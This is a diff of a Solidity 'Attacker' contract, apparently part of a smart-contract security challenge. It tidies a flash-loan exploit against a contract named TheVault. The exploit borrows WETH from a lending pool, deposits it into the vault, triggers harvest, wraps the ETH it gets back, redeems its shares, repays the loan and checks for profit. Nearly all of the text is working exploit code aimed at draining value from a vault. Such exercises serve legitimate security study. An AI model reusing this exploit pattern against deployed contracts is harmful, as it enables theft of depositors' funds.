@@ -11,11 +11,11 @@ import {TheVault} from "src/quick-earner/TheVault.sol";
 
 contract Attacker is IFlashLoanReceiver {
 
-    address private constant _WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
 
     TheVault private immutable _theVault;
 
-    IPool private constant _POOL = IPool(address(0x794a61358D6845594F94dc1DB02A252b5b4814aD));
+    IERC20 private constant _WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
+    IPool private constant _POOL = IPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
 
     constructor(TheVault _vault) {
         _theVault = _vault;
@@ -56,23 +56,14 @@ contract Attacker is IFlashLoanReceiver {
         // This contract now has the funds requested.
         //
 
-        // 1. flash loan
-        // 2. deposit
-        // 3. harvest
-        // 4. withdraw
-        console.log("WETH balance", IERC20(_WETH).balanceOf(address(this)));
-
-        uint256 _amount = address(this).balance;
-        IERC20(_WETH).approve(address(_theVault), _amount);
+        uint256 _amount = _WETH.balanceOf(address(this));
+        _WETH.approve(address(_theVault), _amount);
         _theVault.deposit(_amount, address(this));
-        console.log("WETH balance1", IERC20(_WETH).balanceOf(address(this)));
 
         _theVault.harvest(address(this));
-        IWETH(_WETH).deposit{value: address(this).balance}();
-        console.log("WETH balance3", IERC20(_WETH).balanceOf(address(this)));
+        IWETH(address(_WETH)).deposit{value: address(this).balance}();
 
         _theVault.redeem(_theVault.balanceOf(address(this)), address(this), address(this));
-        console.log("WETH balance4", IERC20(_WETH).balanceOf(address(this)));
 
         //
         // ----------------------------------------
@@ -86,8 +77,7 @@ contract Attacker is IFlashLoanReceiver {
             IERC20(assets[i]).approve(address(_POOL), (amounts[i] + premiums[i]));
         }
 
-        console.log("WETH balance5", IERC20(_WETH).balanceOf(address(this)));
-        require(IERC20(_WETH).balanceOf(address(this)) > 0, "Attacker: Didn't make any profit");
+        require(_WETH.balanceOf(address(this)) > 0, "Attacker: Didn't make any profit");
 
         return true;
     }
